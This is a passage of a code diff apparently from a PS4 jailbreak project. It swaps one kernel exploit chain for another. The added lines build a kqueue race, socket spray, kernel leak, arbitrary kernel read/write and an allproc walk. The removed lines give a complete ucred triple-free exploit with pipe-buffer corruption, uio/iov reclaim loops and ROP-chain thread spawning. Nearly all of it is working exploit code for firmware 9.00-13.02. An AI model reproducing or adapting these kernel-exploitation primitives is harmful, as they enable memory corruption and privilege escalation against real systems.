+    kwrite_direct(kaddr, tmp, buf.length);
+  };
+
+  log('Arbitrary R/W achieved');
+}
+
+/* ============ jailbreak ============ */
+function find_allproc(): BigInt {
+  // use master pipe to locate curproc
+  write32(cpu_mask_buf, Number(getpid()));
+  ioctl(new BigInt(masterRpipeFd), 0x8004667C /* FIOSETOWN */, cpu_mask_buf); // set owner PID
+
+  const fp = fget(masterRpipeFd);
+  const f_data = kread64_direct(fp.add(0x00));
+  const pipe_sigio = kread64_direct(f_data.add(0xd0));
+  let p = kread64_direct(pipe_sigio);
+  kernel.addr.curproc = p;
+
+  // walk allproc list
   while (!(p.and(new BigInt(0xFFFFFFFF, 0x00000000))).eq(new BigInt(0xFFFFFFFF, 0x00000000))) {
-    p = kread64(p.add(0x08)) // p_list.le_prev
-    walk_count++
-    if (walk_count % 100 === 0) {
-      debug('find_allproc - walk_count: ' + walk_count + ' p: ' + hex(p))
-    }
+    p = kread64_direct(p.add(0x08)); // p_list.le_prev
   }
-  debug('find_allproc - Found allproc after ' + walk_count + ' iterations')
-
-  // Don't close - using master_pipe which we need
-
-  return p
+  return p;
 }
 
-function jailbreak () {
-  debug('jailbreak - Starting...')
-  if (!kernel_offset) {
-    throw new Error('Kernel offsets not loaded')
-  }
-  if (FW_VERSION === null) {
-    throw new Error('FW_VERSION is null')
-  }
-  // Stabilize
-  for (let i = 0; i < 10; i++) {
-    sched_yield()
-  }
-  debug('jailbreak - Calling find_allproc...')
-  kernel.addr.allproc = find_allproc() // Set global allproc
-  debug('allproc: ' + hex(kernel.addr.allproc))
+function jailbreak(): void {
+  if (!kernel_offs) throw new Error('kernel offsets not loaded');
+  if (!FW_VERSION) throw new Error('FW_VERSION unknown');
 
-  // Calculate kernel base
-  kernel.addr.base = kl_lock.sub((kernel_offset as { KL_LOCK: number }).KL_LOCK)
-  log('Kernel base: ' + hex(kernel.addr.base))
+  // stabilize
+  for (let i = 0; i < 10; i++) sched_yield();
 
-  jailbreak_shared(FW_VERSION)
+  kernel.addr.allproc = find_allproc();
+  kernel.addr.base = kl_lock.sub(kernel_offs.KL_LOCK);
+  log('Kernel base: ' + hex(kernel.addr.base));
 
-  log('Jailbreak Complete - JAILBROKEN')
-  utils.notify('The Vue-after-Free team congratulates you\nNetCtrl Finished OK\nEnjoy freedom')
+  jailbreak_shared(FW_VERSION);
 
-  cleanup(false) // Close sockets and kill workers on success
-  show_success()
-  run_binloader()
+  log('Jailbreak Complete - JAILBROKEN');
+  utils.notify('kqueue exploit finished\nEnjoy freedom');
+  cleanup();
+  show_success();
+  run_binloader();
 }
 
-function fhold (fp: BigInt) {
-  kwrite32(fp.add(0x28), kread32(fp.add(0x28)) + 1) // f_count
+/* ============ cleanup ============ */
+let cleanup_called = false;
+function cleanup(): void {
+  if (cleanup_called) return;
+  cleanup_called = true;
+  // close IPv6 sockets
+  for (let i = 0; i < IPV6_SOCK_NUM; i++) close(ipv6_socks[i]!);
+  // kill worker threads if any
+  if (spray_ipv6_worker?.thread_id) thr_kill(spray_ipv6_worker.thread_id, 9);
+  // close pipes
+  close(new BigInt(masterRpipeFd)); close(new BigInt(masterWpipeFd));
+  close(new BigInt(victimRpipeFd)); close(new BigInt(victimWpipeFd));
+  // restore affinity / priority
+  if (prev_core >= 0) pin_to_core(prev_core);
+  set_rtprio(prev_rtprio);
 }
 
-function fget (fd: number) {
-  var f = kread64(fdt_ofiles.add(fd * FILEDESCENT_SIZE))
-  debug('Returning fget: ' + hex(f) + ' for fd: ' + fd)
-  return f
+/* ============ exploit orchestration ============ */
+let exploit_count = 0;
+let prev_core = -1;
+let prev_rtprio = -1;
+
+function init(): boolean {
+  log('=== PS4 kqueue race exploit ===');
+  FW_VERSION = get_fwversion();
+  log('Detected PS4 firmware: ' + FW_VERSION);
+  if (!FW_VERSION) {
+    send_notification('Failed to detect firmware');
+    return false;
+  }
+  const cmp = (a: string, b: string) => {
+    const [amaj, amin] = a.split('.').map(Number);
+    const [bmaj, bmin] = b.split('.').map(Number);
+    return amaj === bmaj ? amin! - bmin! : amaj! - bmaj!;
+  };
+  if (cmp(FW_VERSION, '9.00') < 0 || cmp(FW_VERSION, '13.02') > 0) {
+    send_notification('Unsupported firmware\n9.00-13.02 required');
+    return false;
+  }
+  kernel_offs = get_kernel_offset(FW_VERSION);
+  log('Kernel offsets loaded for FW ' + FW_VERSION);
+  return true;
 }
 
-function remove_rthr_from_socket (fd: number) {
-  // In case last triplet was not found in kwriteslow
-  // At this point we don't care about twins/triplets
-  if (fd > 0) {
-    const fp = fget(fd)
-    if (fp.gt(new BigInt(0xFFFF0000, 0x0))) {
-      const f_data = kread64(fp.add(0x00))
-      const so_pcb = kread64(f_data.add(0x18))
-      const in6p_outputopts = kread64(so_pcb.add(0x118))
-      kwrite64(in6p_outputopts.add(0x68), new BigInt(0)) // ip6po_rhi_rthdr
-    } else {
-      debug('Skipped wrong fp: ' + hex(fp) + ' for fd: ' + fd)
-    }
-  }
+function setup(): void {
+  debug('setting up...');
+  prev_core = get_current_core();
+  prev_rtprio = get_rtprio();
+  pin_to_core(MAIN_CORE);
+  set_rtprio(MAIN_RTPRIO);
+
+  // create IPv6 sockets
+  for (let i = 0; i < IPV6_SOCK_NUM; i++) ipv6_socks[i] = socket(AF_INET6, SOCK_STREAM, 0);
+  free_rthdrs(ipv6_socks);
+
+  // create master/victim pipes
+  pipe(pipe_sock); masterRpipeFd = read32(pipe_sock); masterWpipeFd = read32(pipe_sock.add(4));
+  pipe(pipe_sock); victimRpipeFd = read32(pipe_sock); victimWpipeFd = read32(pipe_sock.add(4));
+  fcntl(new BigInt(masterRpipeFd), F_SETFL, O_NONBLOCK);
+  fcntl(new BigInt(masterWpipeFd), F_SETFL, O_NONBLOCK);
+  fcntl(new BigInt(victimRpipeFd), F_SETFL, O_NONBLOCK);
+  fcntl(new BigInt(victimWpipeFd), F_SETFL, O_NONBLOCK);
+
+  // set up the single IPv6 spray worker
+  const sockBuf = malloc(8);
+  socketpair(AF_UNIX, SOCK_STREAM, 0, sockBuf);
+  const r0 = read32(sockBuf), w0 = read32(sockBuf.add(4));
+  spray_ipv6_worker = {
+    rop: ipv6_sock_spray_and_read_rop(spray_ipv6_ready, new BigInt(r0), spray_ipv6_done, spray_ipv6_signal_buf).rop,
+    loop_size: 0,
+    pipe_0: r0, pipe_1: w0,
+    ready: spray_ipv6_ready,
+    done: spray_ipv6_done,
+    signal_buf: spray_ipv6_signal_buf,
+  };
+  init_threading();
+  // spawn the spray worker once (it will exit after one run, we'll re-spawn each time)
 }
 
-const victim_pipe_buf = malloc(PIPEBUF_SIZE)
-
-function corrupt_pipe_buf (cnt: number, _in: number, out: number, size: number, buffer: BigInt) {
-  if (buffer.eq(0)) {
-    throw new Error('buffer cannot be zero')
+function exploit_phase_trigger(): void {
+  if (exploit_count >= MAIN_LOOP_ITER) {
+    log('Failed to acquire kernel R/W');
+    cleanup();
+    return;
   }
-  write32(victim_pipe_buf.add(0x00), cnt)      // cnt
-  write32(victim_pipe_buf.add(0x04), _in)       // in
-  write32(victim_pipe_buf.add(0x08), out)      // out
-  write32(victim_pipe_buf.add(0x0C), size)     // size
-  write64(victim_pipe_buf.add(0x10), buffer)   // buffer
-  write(new BigInt(masterWpipeFd), victim_pipe_buf, PIPEBUF_SIZE)
-
-  // Debug
-  /*
-    read(masterRpipeFd, debug_buffer, PIPEBUF_SIZE);
-    for (const i=0; i<PIPEBUF_SIZE; i=i+8) {
-        const readed = read64(victim_pipe_buf.add(i));
-        debug("corrupt_read: " + hex(readed) );
-    }
-        */
-
-  return read(new BigInt(masterRpipeFd), victim_pipe_buf, PIPEBUF_SIZE)
+  exploit_count++;
+  log('Triggering kqueue race (' + exploit_count + '/' + MAIN_LOOP_ITER + ')...');
+  trigger_kqueue_uaf();
+  exploit_phase_leak();
 }
 
-function kwrite (dest: BigInt, src: BigInt, n: number) {
-  corrupt_pipe_buf(0, 0, 0, PAGE_SIZE, dest)
-  return write(new BigInt(victimWpipeFd), src, n)
+function exploit_phase_leak(): void {
+  setup_kqueue_spray();
+  if (!leak_kqueue()) {
+    exploit_phase_trigger();
+    return;
+  }
+  log('Leaked kqueue, setting up R/W...');
+  exploit_phase_rw();
 }
 
-function kread (dest: BigInt, src: BigInt, n: number) {
-  debug('Enter kread for src: ' + hex(src))
-  corrupt_pipe_buf(n, 0, 0, PAGE_SIZE, src)
-  // Debug
-  read(new BigInt(victimRpipeFd), dest, n)
-  // for (const i=0; i<n; i=i+8) {
-  //    const readed = read64(dest.add(i));
-  // debug("kread_read: " + hex(readed) );
-  // }
+function exploit_phase_rw(): void {
+  setup_arbitrary_rw();
+  log('Jailbreaking...');
+  jailbreak();
 }
 
-function kwrite64 (addr: BigInt, val: BigInt) {
-  write64(tmp, val)
-  kwrite(addr, tmp, 8)
+// entry point
+if (!init()) {
+  // fail silently
+} else {
+  setup();
+  exploit_phase_trigger();
 }
-
-function kwrite32 (addr: BigInt, val: number) {
-  write32(tmp, val)
-  kwrite(addr, tmp, 4)
-}
-
-function kread64 (addr: BigInt) {
-  kread(tmp, addr, 8)
-  return read64(tmp)
-}
-
-function kread32 (addr: BigInt) {
-  kread(tmp, addr, 4)
-  return read32(tmp)
-}
-
-function read_buffer (addr: BigInt, len: number) {
-  const buffer = new Uint8Array(len)
-  for (let i = 0; i < len; i++) {
-    buffer[i] = Number(read8(addr.add(i)))
-  }
-  return buffer
-}
-
-function write_buffer (addr: BigInt, buffer: Uint8Array) {
-  for (let i = 0; i < buffer.length; i++) {
-    write8(addr.add(i), buffer[i]!)
-  }
-}
-
-// Functions used in global kernel.js
-// buf is Uint8Array()
-kernel.read_buffer = function (kaddr, len) {
-  kread(tmp, kaddr, len)
-  return read_buffer(tmp, len)
-}
-
-kernel.write_buffer = function (kaddr, buf) {
-  write_buffer(tmp, buf)
-  kwrite(kaddr, tmp, buf.length)
-}
-
-function remove_uaf_file () {
-  if (uaf_socket === undefined) {
-    throw new Error('uaf_socket is undefined')
-  }
-  const uafFile = fget(uaf_socket)
-  kwrite64(fdt_ofiles.add(uaf_socket * FILEDESCENT_SIZE), new BigInt(0))
-  let removed = 0
-  for (let i = 0; i < 0x1000; i++) {
-    const s = Number(socket(AF_UNIX, SOCK_STREAM, 0))
-    if (fget(s).eq(uafFile)) {
-      kwrite64(fdt_ofiles.add(s * FILEDESCENT_SIZE), new BigInt(0))
-      removed++
-    }
-    close(new BigInt(s))
-    if (removed === 3) {
-      break
-    }
-  }
-}
-
-function trigger_ucred_triplefree () {
-  let end = false
-
-  write64(msgIov.add(0x0), 1) // iov_base
-  write64(msgIov.add(0x8), 1) // iov_len
-
-  let main_count = 0 // Let's do up to 8 iterations
-
-  while (!end && main_count < TRIPLEFREE_ITERATIONS) {
-    main_count++
-
-    // debug('    Memory: avail=' + debugging.info.memory.available + ' dmem=' + debugging.info.memory.available_dmem + ' libc=' + debugging.info.memory.available_libc);
-    const dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0)
-
-    // Register dummy socket.
-    write32(nc_set_buf, Number(dummy_socket.and(0xFFFFFFFF)))
-    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8)
-
-    // Close the dummy socket.
-    close(new BigInt(dummy_socket))
-
-    // Allocate a new ucred.
-    setuid(1)
-
-    // Reclaim the file descriptor.
-    uaf_socket = Number(socket(AF_UNIX, SOCK_STREAM, 0))
-
-    // Free the previous ucred. Now uafSock's cr_refcnt of f_cred is 1.
-    setuid(1)
-
-    // Unregister dummy socket and free the file and ucred.
-    write32(nc_clear_buf, uaf_socket)
-    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 8)
-
-    // Set cr_refcnt back to 1.
-    for (let i = 0; i < 32; i++) {
-      // Reclaim with iov.
-      trigger_iov_recvmsg()
-      sched_yield()
-      // Release buffers.
-      write(new BigInt(iov_sock_1), tmp, 1)
-      wait_iov_recvmsg()
-      read(new BigInt(iov_sock_0), tmp, 1)
-    }
-
-    // Double free ucred.
-    // Note: Only dup works because it does not check f_hold.
-    close(dup(new BigInt(uaf_socket)))
-
-    // debug("Finding Twins...");
-    // Find twins.
-    end = find_twins()
-
-    if (!end) {
-      if (cleanup_called) {
-        throw new Error('Netctrl failed - Shutdown and try again')
-      }
-      // Clean up and start again
-      close(new BigInt(uaf_socket))
-      continue
-    }
-
-    log('Triple freeing...')
-
-    // Free one.
-    free_rthdr(ipv6_socks[twins[1]])
-
-    let count = 0
-
-    // Set cr_refcnt back to 1.
-    while (count < 10000) {
-      // Reclaim with iov.
-      trigger_iov_recvmsg()
-      sched_yield()
-
-      get_rthdr(ipv6_socks[twins[0]], leak_rthdr, 8)
-
-      if (read32(leak_rthdr) === 1) {
-        break
-      }
-
-      // Release iov spray.
-      write(new BigInt(iov_sock_1), tmp, 1)
-      wait_iov_recvmsg()
-      read(new BigInt(iov_sock_0), tmp, 1)
-      count++
-    }
-
-    if (count === 1000) {
-      log('Dropped out from reclaim loop')
-      // Clean up and start again
-      close(new BigInt(uaf_socket))
-      continue
-    }
-
-    triplets[0] = twins[0]
-
-    // Triple free ucred.
-    close(dup(new BigInt(uaf_socket)))
-
-    // Find triplet.
-    triplets[1] = find_triplet(triplets[0], -1)
-
-    // If error start again to better exploit possibility
-    if (triplets[1] === -1) {
-      log("Couldn't find triplet 1")
-      // Clean up and start again
-      // Release iov spray.
-      // if we break on 'read32(leak_rthdr) == 1', we never released workers
-      write(new BigInt(iov_sock_1), tmp, 1)
-      close(new BigInt(uaf_socket))
-      // Start again
-      end = false
-      continue
-    }
-
-    // Release iov spray.
-    // if we break on 'read32(leak_rthdr) == 1', we never released workers
-    write(new BigInt(iov_sock_1), tmp, 1)
-
-    // Find triplet.
-    triplets[2] = find_triplet(triplets[0], triplets[1])
-
-    // If error start again to better exploit possibility
-    if (triplets[2] === -1) {
-      log("Couldn't find triplet 2")
-      // Clean up and start again
-      close(new BigInt(uaf_socket))
-      // Start again
-      end = false
-      continue
-    }
-
-    // Wait iov release completition
-    wait_iov_recvmsg()
-    read(new BigInt(iov_sock_0), tmp, 1)
-  }
-
-  if (main_count === TRIPLEFREE_ITERATIONS) {
-    log('Failed to Triple Free')
-    return false
-  }
-  return true
-}
-
-function leak_kqueue () {
-  // debug('    Memory: avail=' + debugging.info.memory.available + ' dmem=' + debugging.info.memory.available_dmem + ' libc=' + debugging.info.memory.available_libc);
-  debug('Leaking kqueue...')
-
-  // Free one.
-  free_rthdr(ipv6_socks[triplets[1]])
-
-  // Leak kqueue.
-  let kq = new BigInt(0)
-
-  // Minimizing footprint
-  const magic_val = new BigInt(0x0, 0x1430000)
-  const magic_add = leak_rthdr.add(0x08)
-
-  let count = 0
-  while (count < KQUEUE_ITERATIONS) {
-    kq = kqueue()
-
-    // Leak with other rthdr.
-    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x100)
-
-    if (read64(magic_add).eq(magic_val) && !read64(leak_rthdr.add(0x98)).eq(0)) {
-      break
-    }
-
-    close(kq)
-    sched_yield()
-    count++
-  }
-  if (count === KQUEUE_ITERATIONS) {
-    // Dropped out with no kqueue leak
-    log('Failed to leak kqueue_fdp')
-    return false
-  }
-
-  // kq_fdp = read64(leak_rthdr.add(0xA8)); // PS5 offset
-
-  kl_lock = read64(leak_rthdr.add(0x60))
-  kq_fdp = read64(leak_rthdr.add(0x98))
-
-  if (kq_fdp.eq(0)) {
-    log('Failed to leak kqueue_fdp')
-    return false
-  }
-
-  debug('kq_fdp: ' + hex(kq_fdp) + ' kl_lock: ' + hex(kl_lock))
-
-  // for (i=0; i<0x100; i=i+8) {
-  //     debug("leak_rthdr.add(" + i + ") : " + hex(read64(leak_rthdr.add(i))));
-  // }
-
-  // Close kqueue to free buffer.
-  close(kq)
-
-  // Find new triplets[1]
-  triplets[1] = find_triplet(triplets[0], triplets[2])
-
-  return true
-}
-
-function kreadslow64 (address: BigInt) {
-  const buffer = kreadslow(address, 8)
-  // debug("Buffer from kreadslow: " + hex(buffer));
-  if (buffer.eq(BigInt_Error)) {
-    cleanup()
-    throw new Error('Netctrl failed - Shutdown and try again')
-  }
-  return read64(buffer)
-}
-
-function build_uio (uio: BigInt, uio_iov: BigInt, uio_td: number, read: boolean, addr: BigInt, size: number) {
-  write64(uio.add(0x00), uio_iov)        // uio_iov
-  write64(uio.add(0x08), UIO_IOV_NUM)    // uio_iovcnt
-  write64(uio.add(0x10), BigInt_Error)   // uio_offset
-  write64(uio.add(0x18), size)           // uio_resid
-  write32(uio.add(0x20), UIO_SYSSPACE)   // uio_segflg
-  write32(uio.add(0x24), read ? UIO_WRITE : UIO_READ) // uio_segflg
-  write64(uio.add(0x28), uio_td)         // uio_td
-  write64(uio.add(0x30), addr)           // iov_base
-  write64(uio.add(0x38), size)           // iov_len
-}
-
-function kreadslow (addr: BigInt, size: number) {
-  // debug('    Memory: avail=' + debugging.info.memory.available + ' dmem=' + debugging.info.memory.available_dmem + ' libc=' + debugging.info.memory.available_libc);
-  debug('Enter kreadslow addr: ' + hex(addr) + ' size : ' + size)
-
-  // Memory exhaustion check
-  if (debugging.info.memory.available === 0) {
-    log('kreadslow - Memory exhausted before start')
-    cleanup()
-    return BigInt_Error
-  }
-
-  debug('kreadslow - Preparing buffers...')
-
-  // Prepare leak buffers.
-  const leak_buffers = new Array(UIO_THREAD_NUM)
-  for (let i = 0; i < UIO_THREAD_NUM; i++) {
-    leak_buffers[i] = malloc(size)
-  }
-
-  // Set send buf size.
-  write32(sockopt_val_buf, size)
-  setsockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4)
-
-  // Fill queue.
-  write(new BigInt(uio_sock_1), tmp, size)
-
-  // Set iov length
-  write64(uioIovRead.add(0x08), size)
-
-  debug('kreadslow - Freeing triplets[1]=' + triplets[1])
-
-  // Free one.
-  free_rthdr(ipv6_socks[triplets[1]])
-
-  // Minimize footprint
-  const uio_leak_add = leak_rthdr.add(0x08)
-
-  debug('kreadslow - Starting uio reclaim loop...')
-
-  let count = 0
-  let zeroMemoryCount = 0
-  // Reclaim with uio.
-  while (count < 10000) {
-    if (debugging.info.memory.available === 0) {
-      zeroMemoryCount++
-      if (zeroMemoryCount >= 5) {
-        log('netctrl failed!')
-        cleanup()
-        return BigInt_Error
-      }
-    } else {
-      zeroMemoryCount = 0
-    }
-    count++
-    if (count % 100 === 1) {
-      debug('kreadslow - uio loop iter ' + count)
-    }
-    trigger_uio_writev() // COMMAND_UIO_READ in fl0w's
-    sched_yield()
-
-    // Leak with other rthdr.
-    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10)
-
-    if (read32(uio_leak_add) === UIO_IOV_NUM) {
-      break
-    }
-
-    // Wake up all threads.
-    read(new BigInt(uio_sock_0), tmp, size)
-
-    for (let i = 0; i < UIO_THREAD_NUM; i++) {
-      read(new BigInt(uio_sock_0), leak_buffers[i], size)
-    }
-
-    wait_uio_writev()
-
-    // Fill queue.
-    write(new BigInt(uio_sock_1), tmp, size)
-  }
-
-  if (count === 10000) {
-    debug('kreadslow - Failed uio reclaim after 10000 iterations')
-    return BigInt_Error
-  }
-
-  debug('kreadslow - uio reclaim succeeded after ' + count + ' iterations')
-
-  const uio_iov = read64(leak_rthdr)
-  debug('kreadslow - uio_iov: ' + hex(uio_iov))
-
-  // Prepare uio reclaim buffer.
-  build_uio(msgIov, uio_iov, 0, true, addr, size)
-
-  debug('kreadslow - Freeing triplets[2]=' + triplets[2])
-
-  // Free second one.
-  free_rthdr(ipv6_socks[triplets[2]])
-
-  // Minimize footprint
-  const iov_leak_add = leak_rthdr.add(0x20)
-
-  debug('kreadslow - Starting iov reclaim loop...')
-
-  // Reclaim uio with iov.
-  let zeroMemoryCount2 = 0
-  let count2 = 0
-  while (true) {
-    count2++
-    if (debugging.info.memory.available === 0) {
-      zeroMemoryCount2++
-      if (zeroMemoryCount2 >= 5) {
-        log('netctrl failed!')
-        cleanup()
-        return BigInt_Error
-      }
-    } else {
-      zeroMemoryCount2 = 0
-    }
-    // Reclaim with iov.
-    trigger_iov_recvmsg()
-    sched_yield()
-
-    // Leak with other rthdr.
-    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40)
-
-    if (read32(iov_leak_add) === UIO_SYSSPACE) {
-      debug('kreadslow - iov reclaim succeeded after ' + count2 + ' iterations')
-      break
-    }
-
-    // Release iov spray.
-    write(new BigInt(iov_sock_1), tmp, 1)
-    wait_iov_recvmsg()
-    read(new BigInt(iov_sock_0), tmp, 1)
-  }
-
-  debug('kreadslow - Reading leak buffers...')
-
-  // Wake up all threads.
-  read(new BigInt(uio_sock_0), tmp, size)
-  // Read the results now.
-  let leak_buffer: BigInt = new BigInt(0)
-
-  const tag_val = new BigInt(0x41414141, 0x41414141)
-
-  // Get leak.
-  for (let i = 0; i < UIO_THREAD_NUM; i++) {
-    read(new BigInt(uio_sock_0), leak_buffers[i], size)
-    const val = read64(leak_buffers[i])
-    debug('kreadslow - leak_buffers[' + i + ']: ' + hex(val))
-    if (!val.eq(tag_val)) {
-      debug('kreadslow - Found valid leak at index ' + i + ', finding triplets[1]...')
-      // Find triplet.
-      triplets[1] = find_triplet(triplets[0], -1)
-      debug('kreadslow - triplets[1]=' + triplets[1])
-      leak_buffer = leak_buffers[i].add(0)
-    }
-  }
-
-  // Workers should have finished earlier no need to wait
-  wait_uio_writev()
-
-  // Release iov spray.
-  write(new BigInt(iov_sock_1), tmp, 1)
-
-  if (leak_buffer.eq(0)) {
-    debug('kreadslow - No valid leak found')
-    wait_iov_recvmsg()
-    read(new BigInt(iov_sock_0), tmp, 1)
-    return BigInt_Error
-  }
-
-  debug('kreadslow - Finding triplets[2]...')
-
-  // Find triplet[2].
-  for (let retry = 0; retry < 3; retry++) {
-    triplets[2] = find_triplet(triplets[0], triplets[1])
-    if (triplets[2] !== -1) break
-    debug('kreadslow - triplets[2] retry ' + (retry + 1))
-    sched_yield()
-  }
-  debug('kreadslow - triplets[2]=' + triplets[2])
-
-  if (triplets[2] === -1) {
-    debug('kreadslow - Failed to find triplets[2]')
-    wait_iov_recvmsg()
-    read(new BigInt(iov_sock_0), tmp, 1)
-    return BigInt_Error
-  }
-
-  // Let's make sure that they are indeed triplets
-  // const leak_0 = malloc(8);
-  // const leak_1 = malloc(8);
-  // const leak_2 = malloc(8);
-
-  // get_rthdr(ipv6_socks[triplets[0]], leak_0, 8);
-  // get_rthdr(ipv6_socks[triplets[1]], leak_1, 8);
-  // get_rthdr(ipv6_socks[triplets[2]], leak_2, 8);
-
-  // debug("This are triplets values: " + hex(read64(leak_0)) + " " + hex(read64(leak_1)) + " " + hex(read64(leak_2)) );
-
-  // Workers should have finished earlier no need to wait
-  wait_iov_recvmsg()
-  read(new BigInt(iov_sock_0), tmp, 1)
-
-  debug('kreadslow - Done, returning leak_buffer: ' + hex(leak_buffer))
-
-  return leak_buffer
-}
-
-function kwriteslow (addr: BigInt, buffer: BigInt, size: number) {
-  // debug('    Memory: avail=' + debugging.info.memory.available + ' dmem=' + debugging.info.memory.available_dmem + ' libc=' + debugging.info.memory.available_libc);
-  debug('Enter kwriteslow addr: ' + hex(addr) + ' buffer: ' + hex(buffer) + ' size : ' + size)
-
-  // Set send buf size.
-  write32(sockopt_val_buf, size)
-  setsockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4)
-
-  // Set iov length.
-  write64(uioIovWrite.add(0x08), size)
-
-  // Free first triplet.
-  free_rthdr(ipv6_socks[triplets[1]])
-
-  // Minimize footprint
-  const uio_leak_add = leak_rthdr.add(0x08)
-
-  // Reclaim with uio.
-  let zeroMemoryCount = 0
-  while (true) {
-    if (debugging.info.memory.available === 0) {
-      zeroMemoryCount++
-      if (zeroMemoryCount >= 5) {
-        log('netctrl failed!')
-        cleanup()
-        return BigInt_Error
-      }
-    } else {
-      zeroMemoryCount = 0
-    }
-    trigger_uio_readv() // COMMAND_UIO_WRITE in fl0w's
-    sched_yield()
-
-    // Leak with other rthdr.
-    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10)
-
-    if (read32(uio_leak_add) === UIO_IOV_NUM) {
-      // debug("Break on reclaim with uio");
-      break
-    }
-
-    // Wake up all threads.
-    for (let i = 0; i < UIO_THREAD_NUM; i++) {
-      write(new BigInt(uio_sock_1), buffer, size)
-    }
-
-    wait_uio_readv()
-  }
-
-  const uio_iov = read64(leak_rthdr)
-  // debug("This is uio_iov: " + hex(uio_iov));
-
-  // Prepare uio reclaim buffer.
-  build_uio(msgIov, uio_iov, 0, false, addr, size)
-
-  // Free second one.
-  free_rthdr(ipv6_socks[triplets[2]])
-
-  // Minimize footprint
-  const iov_leak_add = leak_rthdr.add(0x20)
-
-  // Reclaim uio with iov.
-  let zeroMemoryCount2 = 0
-  while (true) {
-    if (debugging.info.memory.available === 0) {
-      zeroMemoryCount2++
-      if (zeroMemoryCount2 >= 5) {
-        log('netctrl failed!')
-        cleanup()
-        return BigInt_Error
-      }
-    } else {
-      zeroMemoryCount2 = 0
-    }
-    // Reclaim with iov.
-    trigger_iov_recvmsg()
-    sched_yield()
-
-    // Leak with other rthdr.
-    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40)
-
-    if (read32(iov_leak_add) === UIO_SYSSPACE) {
-      // debug("Break on reclaim uio with iov");
-      break
-    }
-
-    // Release iov spray.
-    write(new BigInt(iov_sock_1), tmp, 1)
-    wait_iov_recvmsg()
-    read(new BigInt(iov_sock_0), tmp, 1)
-  }
-
-  // Corrupt data.
-  for (let i = 0; i < UIO_THREAD_NUM; i++) {
-    write(new BigInt(uio_sock_1), buffer, size)
-  }
-
-  // Find triplet.
-  triplets[1] = find_triplet(triplets[0], -1)
-
-  // Workers should have finished earlier no need to wait
-  wait_uio_readv()
-
-  // Release iov spray.
-  write(new BigInt(iov_sock_1), tmp, 1)
-
-  // Find triplet[2].
-  for (let retry = 0; retry < 3; retry++) {
-    triplets[2] = find_triplet(triplets[0], triplets[1])
-    if (triplets[2] !== -1) break
-    sched_yield()
-  }
-
-  if (triplets[2] === -1) {
-    debug('kwriteslow - Failed to find triplets[2]')
-    wait_iov_recvmsg()
-    read(new BigInt(iov_sock_0), tmp, 1)
-    return BigInt_Error
-  }
-
-  // Workers should have finished earlier no need to wait
-  wait_iov_recvmsg()
-  read(new BigInt(iov_sock_0), tmp, 1)
-
-  return new BigInt(0)
-}
-
-function rop_regen_and_loop (last_rop_entry: BigInt, number_entries: number) {
-  let new_rop_entry = last_rop_entry.add(8)
-  let copy_entry = last_rop_entry.sub(number_entries * 8).add(8)   // We add 8 to have the first ROP instruction add
-  const rop_loop = last_rop_entry.sub(number_entries * 8).add(8)     // We add 8 to have the first ROP instruction add
-
-  for (let i = 0; i < number_entries; i++) {
-    const entry_add = copy_entry
-    const entry_val = read64(copy_entry)
-
-    write64(new_rop_entry.add(0x0), gadgets.POP_RDI_RET)
-    write64(new_rop_entry.add(0x8), entry_add)
-    write64(new_rop_entry.add(0x10), gadgets.POP_RAX_RET)
-    write64(new_rop_entry.add(0x18), entry_val)
-    write64(new_rop_entry.add(0x20), gadgets.MOV_QWORD_PTR_RDI_RAX_RET)
-
-    copy_entry = copy_entry.add(8)
-    new_rop_entry = new_rop_entry.add(0x28)
-  }
-
-  // Time to jump back
-  write64(new_rop_entry.add(0x0), gadgets.POP_RSP_RET)
-  write64(new_rop_entry.add(0x8), rop_loop)
-}
-
-function spawn_thread (rop_array: BigInt[], loop_entries: number, predefinedStack?: BigInt) {
-  const rop_addr = predefinedStack !== undefined ? predefinedStack : malloc(0x600)
-
-  // const rop_addr = malloc(size); // ROP Stack plus extra size
-
-  // Fill ROP Stack
-  for (let i = 0; i < rop_array.length; i++) {
-    write64(rop_addr.add(i * 8), rop_array[i]!)
-    // debug("This is what I wrote: " + hex(read64(rop_race1_addr.add(i*8))));
-  }
-
-  // if loop_entries <> 0 we need to prepare the ROP to regenerate itself and jump back
-  // loop_entries indicates the number of stack entries we need to regenerate
-  if (loop_entries !== 0) {
-    const last_rop_entry = rop_addr.add(rop_array.length * 8).sub(8) // We pass the add of the last ROP instruction
-    rop_regen_and_loop(last_rop_entry, loop_entries)
-    // now our rop size is rop_array.length + loop_entries * (0x28) {copy primitive} + 0x10 {stack pivot}
-  }
-
-  const jmpbuf = malloc(0x60)
-
-  // FreeBSD amd64 jmp_buf layout:
-  // 0x00: RIP, 0x08: RBX, 0x10: RSP, 0x18: RBP, 0x20-0x38: R12-R15, 0x40: FPU, 0x44: MXCSR
-  write64(jmpbuf.add(0x00), gadgets.RET)         // RIP - ret gadget
-  write64(jmpbuf.add(0x10), rop_addr)      // RSP - pivot to ROP chain
-  write32(jmpbuf.add(0x40), saved_fpu_ctrl) // FPU control
-  write32(jmpbuf.add(0x44), saved_mxcsr)    // MXCSR
-
-  const stack_size = new BigInt(0x100)
-  const tls_size = new BigInt(0x40)
-
-  const stack = malloc(Number(stack_size))
-  const tls = malloc(Number(tls_size))
-
-  write64(spawn_thr_args.add(0x00), longjmp_addr)       // start_func = longjmp
-  write64(spawn_thr_args.add(0x08), jmpbuf)             // arg = jmpbuf
-  write64(spawn_thr_args.add(0x10), stack)              // stack_base
-  write64(spawn_thr_args.add(0x18), stack_size)         // stack_size
-  write64(spawn_thr_args.add(0x20), tls)                // tls_base
-  write64(spawn_thr_args.add(0x28), tls_size)           // tls_size
-  write64(spawn_thr_args.add(0x30), spawn_tid)           // child_tid (output)
-  write64(spawn_thr_args.add(0x38), spawn_cpid)               // parent_tid (output)
-
-  const result = thr_new(spawn_thr_args, 0x68)
-  // debug("thr_new result: " + hex(result));
